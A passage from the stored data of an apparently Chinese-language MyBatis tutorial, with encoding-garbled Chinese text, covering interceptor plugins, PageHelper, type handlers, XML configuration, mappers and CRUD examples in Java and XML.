args=java.sql.Statement.class\n        )\n)\npublic class MyFirstPlugin implements Interceptor {\n\n    @Override\n    public Object intercept(Invocation invocation) throws Throwable {\n        return invocation.proceed();\n    }\n\n    @Override\n    public Object plugin(Object target) {\n        return Plugin.wrap(target,this);\n    }\n\n    @Override\n    public void setProperties(Properties properties) {\n\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n<plugins>\n    <plugin interceptor="com.pwddd.mybatis.plugins.MyFirstPlugin">\n        <property name="haha" value="123"/>\n    </plugin>\n</plugins>\n\n\n1\n2\n3\n4\n5\n\n\n\n\n\n# æ©å±\n\n\n# åé¡µ\n\nåé¡µæä»¶å°åï¼Mybatis-PageHelper-DOC\n\n 1. å¼å¥ä¾èµ\n\n<dependency>\n    <groupId>com.github.pagehelper</groupId>\n    <artifactId>pagehelper</artifactId>\n    <version>5.3.0</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n 2. å¼å¥æä»¶\n\n\x3c!-- \n        pluginså¨éç½®æä»¶ä¸­çä½ç½®å¿é¡»ç¬¦åè¦æ±ï¼å¦åä¼æ¥éï¼é¡ºåºå¦ä¸:\n        properties?, settings?, \n        typeAliases?, typeHandlers?, \n        objectFactory?,objectWrapperFactory?, \n        plugins?, \n        environments?, databaseIdProvider?, mappers?\n    --\x3e\n<plugins>\n    \x3c!-- com.github.pagehelperä¸ºPageHelperç±»æå¨åå --\x3e\n    <plugin interceptor="com.github.pagehelper.PageInterceptor">\n        \x3c!-- ä½¿ç¨ä¸é¢çæ¹å¼éç½®åæ°ï¼åé¢ä¼æææçåæ°ä»ç» --\x3e\n        <property name="param1" value="value1"/>\n    </plugin>\n</plugins>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nå·ä½ä½¿ç¨æ¹æ³æ¥çææ¡£ã\n\n\n# æ¹éæä½\n\nSqlSession openSession = sqlSessionFactory.openSession(ExecutorType.BATCH);\n\n\n1\n\n\nspringæ´åæ¶å¯ä»¥æ³¨å¥ä¸ä¸ªbeanï¼ç¶åautowiredèªå¨æ³¨å¥å°daoå±ï¼ä½¿ç¨è¯¥beanåå»ºmapperä»£çç±»å¯¹è±¡ï¼è¿è¡æ¥è¯¢ã\n\n\n# èªå®ä¹ç±»åå¤çå¨ Type Handler\n\n\npublic class MyEnumEmpStatusTypeHandler implements TypeHandler<EmpStatus> {\n\n\t/**\n\t * å®ä¹å½åæ°æ®å¦ä½ä¿å­å°æ°æ®åºä¸­\n\t */\n\t@Override\n\tpublic void setParameter(PreparedStatement ps, int i, EmpStatus parameter,\n\t\t\tJdbcType jdbcType) throws SQLException {\n\t\t// TODO Auto-generated method stub\n\t\tSystem.out.println("è¦ä¿å­çç¶æç ï¼"+parameter.getCode());\n\t\tps.setString(i, parameter.getCode().toString());\n\t}\n\n\t@Override\n\tpublic EmpStatus getResult(ResultSet rs, String columnName)\n\t\t\tthrows SQLException {\n\t\t// TODO Auto-generated method stub\n\t\t//éè¦æ ¹æ®ä»æ°æ®åºä¸­æ¿å°çæä¸¾çç¶æç è¿åä¸ä¸ªæä¸¾å¯¹è±¡\n\t\tint code = rs.getInt(columnName);\n\t\tSystem.out.println("ä»æ°æ®åºä¸­è·åçç¶æç ï¼"+code);\n\t\tEmpStatus status = EmpStatus.getEmpStatusByCode(code);\n\t\treturn status;\n\t}\n\n\t@Override\n\tpublic EmpStatus getResult(ResultSet rs, int columnIndex)\n\t\t\tthrows SQLException {\n\t\t// TODO Auto-generated method stub\n\t\tint code = rs.getInt(columnIndex);\n\t\tSystem.out.println("ä»æ°æ®åºä¸­è·åçç¶æç ï¼"+code);\n\t\tEmpStatus status = EmpStatus.getEmpStatusByCode(code);\n\t\treturn status;\n\t}\n\n\t@Override\n\tpublic EmpStatus getResult(CallableStatement cs, int columnIndex)\n\t\t\tthrows SQLException {\n\t\t// TODO Auto-generated method stub\n\t\tint code = cs.getInt(columnIndex);\n\t\tSystem.out.println("ä»æ°æ®åºä¸­è·åçç¶æç ï¼"+code);\n\t\tEmpStatus status = EmpStatus.getEmpStatusByCode(code);\n\t\treturn status;\n\t}\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n<typeHandlers>\n    \x3c!--1ãéç½®æä»¬èªå®ä¹çTypeHandler  --\x3e\n    <typeHandler handler="com.atguigu.mybatis.typehandler.MyEnumEmpStatusTypeHandler" javaType="com.atguigu.mybatis.bean.EmpStatus"/>\n    \x3c!--2ãä¹å¯ä»¥å¨å¤çæä¸ªå­æ®µçæ¶ååè¯MyBatisç¨ä»ä¹ç±»åå¤çå¨\n    ä¿å­ï¼#{empStatus,typeHandler=xxxx}\n    æ¥è¯¢ï¼\n     <resultMap type="com.atguigu.mybatis.bean.Employee" id="MyEmp">\n       <id column="id" property="id"/>\n       <result column="empStatus" property="empStatus" typeHandler=""/>\n      </resultMap>\n    æ³¨æï¼å¦æå¨åæ°ä½ç½®ä¿®æ¹TypeHandlerï¼åºè¯¥ä¿è¯ä¿å­æ°æ®åæ¥è¯¢æ°æ®ç¨çTypeHandleræ¯ä¸æ ·çã\n    --\x3e\n</typeHandlers>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n',normalizedContent:'# mybatis\n\n\n# mybatisç®ä»\n\nmybatis æ¯ä¸æ¬¾ä¼ç§çæä¹å±æ¡æ¶ï¼å®æ¯æèªå®ä¹ sqlãå­å¨è¿ç¨ä»¥åé«çº§æ å°ãmybatis åé¤äºå ä¹ææç jdbc ä»£ç ä»¥åè®¾ç½®åæ°åè·åç»æéçå·¥ä½ãmybatis å¯ä»¥éè¿ç®åç xml ææ³¨è§£æ¥éç½®åæ å°åå§ç±»åãæ¥å£å java pojoï¼plain old java objectsï¼æ®éèå¼ java å¯¹è±¡ï¼ä¸ºæ°æ®åºä¸­çè®°å½ã\n\nä¹åçæ°æ®åºæä½æ¹å¼ï¼åçjdbc-> jdbcutils -> jdbctemplates -> mybatis\n\n\n\n\n\n\n# mybatisdemoé¡¹ç®\n\n\n# èæ¹æ³\n\n 0. åå»ºæµè¯æ°æ®åºï¼å¹¶åå»ºæµè¯è¡¨\n\ncreate table tbl_employee(\nid int(11) primary key auto_increment,\nlast_name varchar(200),\ngender char(1),\nemail varchar(200)\n\n);\n\n\n1\n2\n3\n4\n5\n6\n7\n\n 1. å»ºç«mavené¡¹ç®ï¼å¼å¥mybatisç¸å³ä¾èµ\n\nè¦ä½¿ç¨ mybatisï¼ åªéå° mybatis-x.x.x.jar æä»¶ç½®äºç±»è·¯å¾ï¼classpathï¼ä¸­å³å¯ã\n\nå¦æä½¿ç¨ maven æ¥æå»ºé¡¹ç®ï¼åéå°ä¸é¢çä¾èµä»£ç ç½®äº pom.xml æä»¶ä¸­ï¼\n\n<dependencies>  \n     <dependency>  \n <groupid>org.mybatis</groupid>  \n <artifactid>mybatis</artifactid>  \n <version>3.5.9</version>  \n </dependency>  \n  \n \x3c!-- https://mvnrepository.com/artifact/mysql/mysql-connector-java --\x3e  \n <dependency>  \n <groupid>mysql</groupid>  \n <artifactid>mysql-connector-java</artifactid>  \n <version>8.0.22</version>  \n </dependency>  \n  \n \x3c!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --\x3e  \n <dependency>  \n <groupid>org.apache.logging.log4j</groupid>  \n <artifactid>log4j-core</artifactid>  \n <version>2.17.1</version>  \n </dependency>  \n  \n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n 2. éç½®æ¥å¿æå°\n\n<settings>  \n <setting name="logimpl" value="stdout_logging" />  \n</settings>\n\n\n1\n2\n3\n\n 3. åå»ºmybatis-config.xmléç½®æä»¶ï¼éç½®æ°æ®æº\n\n<?xml version="1.0" encoding="utf-8" ?>  \n<!doctype configuration  \n public "-//mybatis.org//dtd config 3.0//en"  \n "http://mybatis.org/dtd/mybatis-3-config.dtd">  \n<configuration>  \n <environments default="development">  \n <environment id="development">  \n <transactionmanager type="jdbc"/>  \n <datasource type="pooled">  \n <property name="driver" value="com.mysql.jdbc.driver"/>  \n <property name="url" value="jdbc:mysql://localhost:3306/testmybatis"/>  \n <property name="username" value="root"/>  \n <property name="password" value="123456"/>  \n </datasource>  \n </environment>  \n </environments>  \n <mappers>  \n     \x3c!--æ å°æä»¶ä½äºclasspathä¸ --\x3e\n <mapper resource="employeemapper.xml"></mapper>  \n </mappers>  \n</configuration>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n 4. ä» xml ä¸­æå»º sqlsessionfactory\n\næ¯ä¸ªåºäº mybatis çåºç¨é½æ¯ä»¥ä¸ä¸ª sqlsessionfactory çå®ä¾ä¸ºæ ¸å¿çãsqlsessionfactory çå®ä¾å¯ä»¥éè¿ sqlsessionfactorybuilder è·å¾ãè sqlsessionfactorybuilder åå¯ä»¥ä» xml éç½®æä»¶æä¸ä¸ªé¢åéç½®ç configuration å®ä¾æ¥æå»ºåº sqlsessionfactory å®ä¾ã\n\nä» xml æä»¶ä¸­æå»º sqlsessionfactory çå®ä¾éå¸¸ç®åï¼å»ºè®®ä½¿ç¨ç±»è·¯å¾ä¸çèµæºæä»¶è¿è¡éç½®ã ä½ä¹å¯ä»¥ä½¿ç¨ä»»æçè¾å¥æµï¼inputstreamï¼å®ä¾ï¼æ¯å¦ç¨æä»¶è·¯å¾å­ç¬¦ä¸²æ file:// url æé çè¾å¥æµãmybatis åå«ä¸ä¸ªåå« resources çå·¥å·ç±»ï¼å®åå«ä¸äºå®ç¨æ¹æ³ï¼ä½¿å¾ä»ç±»è·¯å¾æå¶å®ä½ç½®å è½½èµæºæä»¶æ´å å®¹æã\n\npublic static void main(string[] args) throws ioexception {  \n string resource = "mybatis-config.xml";  \n inputstream resourceasstream = resources.getresourceasstream(resource);  \n sqlsessionfactory sqlsessionfactory = new sqlsessionfactorybuilder().build(resourceasstream);  \n sqlsession sqlsession = sqlsessionfactory.opensession();  \n system.out.println(sqlsession);  \n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 5. åå»ºå®ä½ç±»\n\npackage com.pwddd.mybatis3.entity;  \n  \npublic class employee {  \n private int id;  \n private string lastname;  \n private int gender;  \n private string email;  \n  \n public int getid() {  \n return id;  \n }  \n  \n public void setid(int id) {  \n this.id = id;  \n }  \n  \n public string getlastname() {  \n return lastname;  \n }  \n  \n public void setlastname(string lastname) {  \n this.lastname = lastname;  \n }  \n  \n public int getgender() {  \n return gender;  \n }  \n  \n public void setgender(int gender) {  \n this.gender = gender;  \n }  \n  \n public string getemail() {  \n return email;  \n }  \n  \n public void setemail(string email) {  \n this.email = email;  \n }  \n  \n @override  \n public string tostring() {  \n return "employee{" +  \n "id=" + id +  \n ", lastname=\'" + lastname + \'\\\'\' +  \n ", gender=" + gender +  \n ", email=\'" + email + \'\\\'\' +  \n \'}\';  \n }  \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n 6. åå»ºæ å°sqlè¯­å¥\n\n<?xml version="1.0" encoding="utf-8" ?>  \n<!doctype mapper  \n public "-//mybatis.org//dtd mapper 3.0//en"  \n "http://mybatis.org/dtd/mybatis-3-mapper.dtd">  \n\x3c!--åç§°ç©ºé´åæ¥è¯¢ä¸­çåç§°ç©ºé´ä¸è´--\x3e\n<mapper namespace="com.pwddd.mybatis3.employeemapper">  \n \x3c!--  \n namespace:åç§°ç©ºé´;æå®ä¸ºæ¥å£çå¨ç±»å  \n idï¼å¯ä¸æ è¯  \n resulttypeï¼è¿åå¼ç±»å  \n #{id}ï¼ä»ä¼ éè¿æ¥çåæ°ä¸­ååºidå¼  \n  \n public employee getempbyid(integer id); --\x3e <select id="getempbyid" resulttype="com.pwddd.mybatis3.entity.employee"> \n   \n select id,last_name,email,gender from tbl_employee where id = #{id}  \n </select>  \n</mapper>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n 7. åå»ºæ¥è¯¢\n\npublic static void main(string[] args) {  \n string resource = "mybatis-config.xml";  \n inputstream resourceasstream = null;  \n sqlsession sqlsession = null;  \n try {  \n resourceasstream = resources.getresourceasstream(resource);  \n sqlsessionfactory sqlsessionfactory = new sqlsessionfactorybuilder().build(resourceasstream);  \n sqlsession = sqlsessionfactory.opensession();  \n  \n employee employee = sqlsession.selectone("com.pwddd.mybatis3.employeemapper.getempbyid", 1);  \n system.out.println(employee);  \n } catch (ioexception e) {  \n e.printstacktrace();  \n } finally {  \n sqlsession.close();  \n }  \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# æ¥å£å¼ç¼ç¨æ¹å¼\n\n 1. åå»ºæ¥å£\n\npackage com.pwddd.mybatis3.dao;  \n  \nimport com.pwddd.mybatis3.entity.employee;  \n  \npublic interface employeemapper {  \n employee getempbyid(integer id);  \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n 2. namespaceéç½®æ¥å£å¨ç±»å\n\n<mapper namespace="com.pwddd.mybatis3.dao.employeemapper">\n\n\n1\n\n 3. mapper.xmlä¸­æ¥è¯¢æ¹æ³ååæ¥å£ä¸­å®ä¹çæ¹æ³åä¸è´\n\n<select id="getempbyid" resulttype="com.pwddd.mybatis3.entity.employee">  \n select id,last_name as lastname,email,gender from tbl_employee where id = #{id}  \n</select>\n\n\n1\n2\n3\n\n 4. ç¼åæµè¯æ¹æ³\n\n@test\npublic void testinterface() throws ioexception {\n    string resource = "mybatis-config.xml";\n    inputstream resourceasstream = resources.getresourceasstream(resource);\n    sqlsessionfactory sqlsessionfactory = new sqlsessionfactorybuilder().build(resourceasstream);\n    sqlsession sqlsession = sqlsessionfactory.opensession();\n    employeemapper mapper = sqlsession.getmapper(employeemapper.class);\n    employee emp = mapper.getempbyid(1);\n    system.out.println(emp);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# mybatiséç½®æä»¶\n\n\n# properties æ ç­¾\n\nå¨mybatiséç½®æä»¶ä¸­çä¸äºå±æ§ï¼å¦æ°æ®åºé¾æ¥çç¸å³ä¿¡æ¯ï¼å¯ä»¥éç½®å¨å¤é¨çéç½®æä»¶ä¸­ï¼éè¿propertiesæ ç­¾å°å¤é¨çéç½®æä»¶å¼å¥ï¼ç¶åä½¿ç¨${}å°éç½®å¯¼å¥å°mybatiséç½®æä»¶ä¸­ãå·ä½çç¨æ³å¦ä¸é¢æç¤ºï¼\n\n<properties resource="jdbc.properties" />\n\n\n1\n\n\né¤æ­¤ä¹å¤ï¼è¿å¯ä»¥å¨properties æ ç­¾åè®¾ç½®ç¸å³å±æ§çå¼ï¼ä½æ¯è¿æ ·ä¸ä¼æ¿æ¢æå¤é¨éç½®æä»¶ä¸­è®¾ç½®çå¼ï¼åªæ¯å¢å å¼ï¼\n\n<properties resource="jdbc.properties">  \n <property name="username" value="root"/>  \n <property name="password" value="123456"/>  \n</properties>\n\n\n1\n2\n3\n4\n\n\né¤æ­¤ä¹å¤ï¼è¿å¯ä»¥å¨åå»ºsqlsessionfactoryæ¶å°éç½®æä»¶ä¼ å¥ï¼\n\n@test\npublic void testresource() throws ioexception {\n    string resource = "mybatis-config.xml";\n    inputstream resourceasstream = resources.getresourceasstream(resource);\n    properties properties = new properties();\n    properties.load(new fileinputstream(new file("src/main/resources/jdbc.properties")));\n    sqlsessionfactory build = new sqlsessionfactorybuilder().build(resourceasstream, properties);\n    sqlsession sqlsession = build.opensession();\n    system.out.println(sqlsession);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nä»mybatis 3.4.2çæ¬å¼å§ï¼å¯ä»¥ä¸ºå±æ§è®¾ç½®ä¸ä¸ªé»è®¤å¼ï¼å¦æè·åä¸å°å¼åä½¿ç¨é»è®¤å¼ï¼ä½æ¯é»è®¤å¼çå±æ§æ²¡æå¼å¯ï¼å¹¶ä¸é»è®¤çåéç¬¦æ¯ï¼ï¼å¯ä»¥ä½¿ç¨å¦ä¸çéç½®è¿è¡è®¾ç½®åä½¿ç¨ãä¿®æ¹é»è®¤çåéç¬¦çç®çæ¯å¦æå±æ§åä¸­å«æå¶ä»çåå·åå®¹æå²çªï¼å¦æä¸å«ï¼é£ä¹å¯ä»¥æ­£å¸¸ä½¿ç¨é»è®¤å¼ï¼\n\n<property name="org.apache.ibatis.parsing.propertyparser.enable-default-value" value="true"/>  \n<property name="org.apache.ibatis.parsing.propertyparser.default-value-separator" value="?:"/>\n\n<property name="username" value="${mysql.username?:root}"/>\n\n\n1\n2\n3\n4\n\n\n\n# settings æ ç­¾\n\nè¿æ¯ mybatis ä¸­æä¸ºéè¦çè°æ´è®¾ç½®ï¼å®ä»¬ä¼æ¹å mybatis çè¿è¡æ¶è¡ä¸ºãç¨æ¥å¯¹mybatisè¿è¡ä¸äºè®¾ç½®çéç½®ã\n\nå¸¸ç¨çéç½®åå®¹ååè½å¦ä¸ï¼\n\n#todo\n\n\n\nå¼å¯é©¼å³°å½åï¼\n\n<setting name="mapunderscoretocamelcase" value="true"/>\n\n\n1\n\n\næ°æ®åºå¯¹äºnullå¼çå¹éå¤ç\n\n<setting name="jdbctypefornull" value="null"/>\n\n\n1\n\n\nå¼å¯åæ­¥æ¥è¯¢æå è½½ï¼\n\n<setting name="lazyloadingenabled" value="true"/>\n\x3c!--        æç§éè¦è¿è¡å±æ§çå è½½--\x3e\n<setting name="aggressivelazyloading" value="false"/>\n\n\n1\n2\n3\n\n\n\n# typealiases å«åå¤çå¨\n\nç¨äºç»ç±»åèµ·å«åï¼ä»ç¨äº xml éç½®ï¼æå¨éä½åä½çå¨éå®ç±»åä¹¦åãå¨éå¸¸æåµä¸ï¼æä»¬å¨mapperä¸­éç½®çresulttypeéå¸¸ä¸ºç±»çå¨ç±»åï¼è¿ç§æ¹æ³è¿äºåä½ï¼å¯ä»¥ä½¿ç¨å«åçæ¹å¼ï¼ä»¥åéç½®å°±å¯ä»¥ç¨å«åä»£æ¿å¨ç±»åäºã\n\n<typealiases>\n    <typealias type="com.pwddd.mybatis.bean.employee" alias="emp" />\n</typealiases>\n\n\n1\n2\n3\n\n\né¤æ­¤ä¹å¤ï¼è¿å¯ä»¥éç½®æ¹éåä¸é¢çå«åï¼å¦ä¸éç½®ä¸­çåä¸çææç±»é½ä¼æä¸ä¸ªé¦å­æ¯å°åçå«åï¼\n\n<typealiases> \n\t<package name="domain.blog"/> \n</typealiases>\n\n\n1\n2\n3\n\n\nè¿å¯ä»¥ä½¿ç¨æ³¨è§£çæ¹å¼ï¼ä¸ºç±»èµ·å«åï¼ä½æ¯åææ¯éç½®åçå«åï¼\n\n<typealiases>  \n    <package name="com.pwddd.hello.entity"/>  \n    \x3c!--        <typealias type="com.pwddd.hello.entity.employee" alias="employee" />--\x3e  \n</typealiases>\n\n\n1\n2\n3\n4\n\n\n@alias("emp")  \npublic class employee {\n\n\n1\n2\n\n\n\n# typehandlers\n\nmybatis å¨è®¾ç½®é¢å¤çè¯­å¥ï¼preparedstatementï¼ä¸­çåæ°æä»ç»æéä¸­ååºä¸ä¸ªå¼æ¶ï¼ é½ä¼ç¨ç±»åå¤çå¨å°è·åå°çå¼ä»¥åéçæ¹å¼è½¬æ¢æ java ç±»åãä» 3.4.5 å¼å§ï¼mybatis é»è®¤æ¯æ jsr-310ï¼æ¥æåæ¶é´ apiï¼ã\n\n\n# plugins\n\nmybatis åè®¸ä½ å¨æ å°è¯­å¥æ§è¡è¿ç¨ä¸­çæä¸ç¹è¿è¡æ¦æªè°ç¨ãé»è®¤æåµä¸ï¼mybatis åè®¸ä½¿ç¨æä»¶æ¥æ¦æªçæ¹æ³è°ç¨åæ¬ï¼\n\n * executor (update, query, flushstatements, commit, rollback, gettransaction, close, isclosed)\n * parameterhandler (getparameterobject, setparameters)\n * resultsethandler (handleresultsets, handleoutputparameters)\n * statementhandler (prepare, parameterize, batch, update, query)\n\n\n# environments\n\nmybaitsä¸ºäºæ´å¥½çéåºå¤ç§æ°æ®åºçè¿æ¥éè¦ï¼å¹¶ä¸æ¹ä¾¿å¤ä¸ªæ°æ®åºä¹é´çåæ¢ä½¿ç¨ï¼ä½¿ç¨environmentså¯¹æ°æ®åºè¿è¡éç½®ãenvironmentsæ ç­¾æä¸ä¸ªdefaultå±æ§ç¨äºæå®å½åä½¿ç¨çç¯å¢ãå¨environmentsæ ç­¾ä¸åæenvironmentæ ç­¾ï¼ç¨äºéç½®å¤ä¸ªæ°æ®åºç¯å¢ã\n\n<environments default="mysql">  \n <environment id="mysql">  \n <transactionmanager type="jdbc" />  \n <datasource type="pooled">  \n <property name="driver" value="${mysql.driver}"/>  \n <property name="url" value="${mysql.url}"/>  \n <property name="username" value="${username?:root}"/>  \n <property name="password" value="${mysql.password}"/>  \n </datasource>  \n </environment>  \n</environments>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n# transactionmanager\n\nå¨ mybatis ä¸­æä¸¤ç§ç±»åçäºå¡ç®¡çå¨ï¼ä¹å°±æ¯ type="[jdbc|managed]"ï¼ï¼\n\n * jdbc â è¿ä¸ªéç½®ç´æ¥ä½¿ç¨äº jdbc çæäº¤ååæ»è®¾æ½ï¼å®ä¾èµä»æ°æ®æºè·å¾çè¿æ¥æ¥ç®¡çäºå¡ä½ç¨åã\n * managed â è¿ä¸ªéç½®å ä¹æ²¡åä»ä¹ãå®ä»ä¸æäº¤æåæ»ä¸ä¸ªè¿æ¥ï¼èæ¯è®©å®¹å¨æ¥ç®¡çäºå¡çæ´ä¸ªçå½å¨æï¼æ¯å¦ jee åºç¨æå¡å¨çä¸ä¸æï¼ã é»è®¤æåµä¸å®ä¼å³é­è¿æ¥ã\n\nä½æ¯å¦æä½¿ç¨çspring+mybatisï¼åå¯ä»¥å°äºå¡å¤çäº¤ç»springæ¥åã\n\n# datasource\n\nmybatisæä¸å¤§åå»ºçæ°æ®æºï¼\n\n * unpooledï¼è¿ä¸ªæ°æ®æºçå®ç°ä¼æ¯æ¬¡è¯·æ±æ¶æå¼åå³é­è¿æ¥ã\n * pooledï¼è¿ç§æ°æ®æºçå®ç°å©ç¨âæ± âçæ¦å¿µå° jdbc è¿æ¥å¯¹è±¡ç»ç»èµ·æ¥ï¼é¿åäºåå»ºæ°çè¿æ¥å®ä¾æ¶æå¿éçåå§ååè®¤è¯æ¶é´ã è¿ç§å¤çæ¹å¼å¾æµè¡ï¼è½ä½¿å¹¶å web åºç¨å¿«éååºè¯·æ±ã\n * jndiï¼è¿ä¸ªæ°æ®æºå®ç°æ¯ä¸ºäºè½å¨å¦ ejb æåºç¨æå¡å¨è¿ç±»å®¹å¨ä¸­ä½¿ç¨ï¼å®¹å¨å¯ä»¥éä¸­æå¨å¤é¨éç½®æ°æ®æºï¼ç¶åæ¾ç½®ä¸ä¸ª jndi ä¸ä¸æçæ°æ®æºå¼ç¨ã\n\né¤æ­¤ä¹å¤è¿å¯ä»¥èªå®ä¹æ°æ®æºï¼typeä¸ºèªå®ä¹æ°æ®æºçå¨ç±»åã\n\n\n# databaseidprovider\n\nmybatisä¸ºä¸åçæ°æ®åºè®¾ç½®äºä¸åçæ°æ®åºçæ è¯ãè¿ç§å¤ååçæ¯ææ¯åºäºæ å°è¯­å¥ä¸­ç databaseid å±æ§ã mybatis ä¼å è½½å¸¦æå¹éå½åæ°æ®åº databaseid å±æ§åææä¸å¸¦ databaseid å±æ§çè¯­å¥ãè¿ç§å¤ååçæ¯ææ¯åºäºæ å°è¯­å¥ä¸­ç databaseid å±æ§ã mybatis ä¼å è½½å¸¦æå¹éå½åæ°æ®åº databaseid å±æ§åææä¸å¸¦ databaseid å±æ§çè¯­å¥ãåªéè¦ä¸ºä¸åçsqlè¯­å¥éç½®æ°æ®åºæ ç­¾ï¼databaseidï¼å³å¯ã\n\n<databaseidprovider type="db_vendor">  \n <property name="sql server" value="sqlserver"/>  \n <property name="db2" value="db2"/>  \n <property name="oracle" value="oracle" />  \n</databaseidprovider>\n\n\n1\n2\n3\n4\n5\n\n\n\n# mappers\n\næä»¬éè¦åè¯mabatiså»åªéå¯»æ¾æä»¬çmapperéç½®æä»¶ãä½ å¯ä»¥ä½¿ç¨ç¸å¯¹äºç±»è·¯å¾çèµæºå¼ç¨ï¼æå®å¨éå®èµæºå®ä½ç¬¦ï¼åæ¬ file:/// å½¢å¼ç urlï¼ï¼æç±»ååååç­ãä¾å¦ï¼\n\n\n\x3c!-- ä½¿ç¨ç¸å¯¹äºç±»è·¯å¾çèµæºå¼ç¨ --\x3e  \n<mappers>  \n <mapper resource="org/mybatis/builder/authormapper.xml"/>  \n <mapper resource="org/mybatis/builder/blogmapper.xml"/>  \n <mapper resource="org/mybatis/builder/postmapper.xml"/>  \n</mappers>  \n\x3c!-- ä½¿ç¨å®å¨éå®èµæºå®ä½ç¬¦ï¼urlï¼ --\x3e  \n<mappers>  \n <mapper url="file:///var/mappers/authormapper.xml"/>  \n <mapper url="file:///var/mappers/blogmapper.xml"/>  \n <mapper url="file:///var/mappers/postmapper.xml"/>  \n</mappers>  \n\x3c!-- ä½¿ç¨æ å°å¨æ¥å£å®ç°ç±»çå®å¨éå®ç±»å --\x3e  \n<mappers>  \n <mapper class="org.mybatis.builder.authormapper"/>  \n <mapper class="org.mybatis.builder.blogmapper"/>  \n <mapper class="org.mybatis.builder.postmapper"/>  \n</mappers>  \n\x3c!-- å°ååçæ å°å¨æ¥å£å®ç°å¨é¨æ³¨åä¸ºæ å°å¨ --\x3e  \n<mappers>  \n <package name="org.mybatis.builder"/>  \n</mappers>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\nå¶ä¸­ï¼ä½¿ç¨æ å°å¨æ¥å£å®ç°ç±»çå®å¨éå®ç±»åè¿è¡æ³¨åæ¶ï¼å¯ä»¥ä½¿ç¨æ³¨è§£çæ¹å¼è¿è¡éç½®ã\n\n\t@select("select * from tbl_employee where id=#{id}")\n\tpublic employee getempbyid(integer id);\n\n\n1\n2\n\n\nè¿ç§æ¹å¼è½ç¶ä¾¿æ·ï¼ä½æ¯å¯¹äºå¤æçsqlè¯­å¥ä¸æ¯å¾åå¥½ï¼å æ­¤å¤æçè¯­å¥å»ºè®®è¿æ¯å¨mapperéç½®æä»¶ä¸­ç¼åã\n\n\n# mapperæ å°æä»¶\n\nsql æ å°æä»¶åªæå¾å°çå ä¸ªé¡¶çº§åç´ ï¼æç§åºè¢«å®ä¹çé¡ºåºååºï¼ï¼\n\n * cache â è¯¥å½åç©ºé´çç¼å­éç½®ã\n * cache-ref â å¼ç¨å¶å®å½åç©ºé´çç¼å­éç½®ã\n * resultmap â æè¿°å¦ä½ä»æ°æ®åºç»æéä¸­å è½½å¯¹è±¡ï¼æ¯æå¤æä¹æ¯æå¼ºå¤§çåç´ ã\n * parametermap â èå¼é£æ ¼çåæ°æ å°ãæ­¤åç´ å·²è¢«åºå¼ï¼å¹¶å¯è½å¨å°æ¥è¢«ç§»é¤ï¼è¯·ä½¿ç¨è¡ååæ°æ å°ãææ¡£ä¸­ä¸ä¼ä»ç»æ­¤åç´ ã\n * sql â å¯è¢«å¶å®è¯­å¥å¼ç¨çå¯éç¨è¯­å¥åã\n * insert â æ å°æå¥è¯­å¥ã\n * update â æ å°æ´æ°è¯­å¥ã\n * delete â æ å°å é¤è¯­å¥ã\n * select â æ å°æ¥è¯¢è¯­å¥ã\n\n\n# å¢å æ¹æ¥\n\nmapperæ å°æä»¶ï¼\n\n<select id="getempbyid" resulttype="employee">\n        select * from tbl_employee where id = #{id}\n    </select>\n\n    <insert id="addemp" >\n        insert into tbl_employee(last_name,gender,email) values (#{lastname},#{gender},#{email})\n    </insert>\n\n    <update id="updateemp" >\n        update tbl_employee\n            set last_name = #{lastname},\n             gender = #{gender},\n             email = #{email}\n        where id = #{id};\n    </update>\n\n    <delete id="deleteemp" >\n        delete\n        from tbl_employee\n        where id=#{id};\n    </delete>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\nå¯¹åºæ¥å£ï¼\n\nemployee getempbyid(integer id);\ninteger addemp(employee employee);\ninteger updateemp(employee employee);\ninteger deleteemp(integer id);\n\n\n1\n2\n3\n4\n\n\næµè¯ï¼\n\n@test\npublic void testcrud() throws ioexception {\n    string resource = "mybatis-config.xml";\n    inputstream resourceasstream = resources.getresourceasstream(resource);\n    sqlsessionfactory sqlsessionfactory = new sqlsessionfactorybuilder().build(resourceasstream);\n    sqlsession sqlsession = sqlsessionfactory.opensession();\n    employeemapper employeemapper = sqlsession.getmapper(employeemapper.class);\n    system.out.println(employeemapper.deleteemp(2));\n    system.out.println(employeemapper.addemp(new employee(4, "zhangsan", 1, "123@qq.com")));\n    